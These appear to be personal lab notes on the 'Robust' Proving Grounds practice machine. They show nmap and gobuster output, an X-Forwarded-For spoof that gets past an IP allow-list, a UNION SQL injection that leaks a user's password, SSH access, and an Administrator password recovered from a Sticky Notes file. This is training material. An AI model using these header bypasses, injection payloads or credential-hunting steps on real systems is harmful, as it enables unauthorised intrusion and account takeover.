---
tags: [ProvingGround]
---

5/8/2025

Robust
https://www.northover.co/articles/robust-proving-grounds-practice
-------------------------

## 1. PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH for_Windows_8.1 (protocol 2.0)
| ssh-hostkey:
|   3072 21:76:63:1c:3b:10:a6:a7:73:d6:e7:dd:1e:a2:b6:83 (RSA)
|   256 62:a8:39:f6:ab:92:cd:26:03:bf:1e:28:25:4e:8e:7a (ECDSA)
|_  256 02:39:7c:e2:af:6a:44:98:ec:9a:28:98:a0:8b:fe:c4 (ED25519)
80/tcp   open  http       PHP cli server 5.5 or later (PHP 7.3.33)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was login.php
7680/tcp open  pando-pub?
## 2. Visted 192.168.208.200/login.php received error - Your IP is not allowed to use this webservice. Only 10.10.10.x is allowed
## 3. Bypassed by adding 'X-Forwarded-For: 10.10.10.5' to the request header.
## 4. gobuster dir -u http://192.168.208.200/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt \
-H "X-Forwarded-For: 10.10.10.5" -x php,bak,conf,txt,zip,sql,inc -b 302,404

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.208.200/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
[+] Negative Status codes:   302,404
[+] User Agent:              gobuster/3.6
[+] Extensions:              sql,inc,php,bak,conf,txt,zip
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login.php            (Status: 200) [Size: 1770]
/favicon.ico          (Status: 200) [Size: 5430]
/ip.php               (Status: 200) [Size: 0]
/.DS_Store            (Status: 200) [Size: 6148]
/Login.php            (Status: 200) [Size: 1770]
/Favicon.ico          (Status: 200) [Size: 5430]
/.ds_store            (Status: 200) [Size: 6148]
/favicon.ICO          (Status: 200) [Size: 5430]
Progress: 137032 / 137040 (99.99%)
===============================================================
Finished

## 5. 192.168.208.200/ip.php
## 6. wfuzz -H "X-Forwarded-For: 10.10.10.10" --sc 302 -u http://192.168.45.235/FUZZ.php -w /usr/share/wordlists/wfuzz/general/big.txt
## 7. 192.168.208.200/home.php
## 8. Added response and request headers using "match" in Burp to make it easier to navigate site.
## 9. Used ' UNION select * from employees' is search first name. Returned Jeff password Mathsisfun123
## 10. SSH'd using Jeff and password
## 11. cd  C:\Users\Jeff\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState>
## 12.  Administrator:MySupersecurePassword2112ManagedPosition=Yellow983b5947-15eb-4375-97f6-2d646a91dba42fa3c77f-fd17-442c-a2e8-11cd97ffdbb┘αö"£e┘αö=,
►☼╪☼╪'♥U        983b5947-15eb-4375-97f6-2d646a91dba4
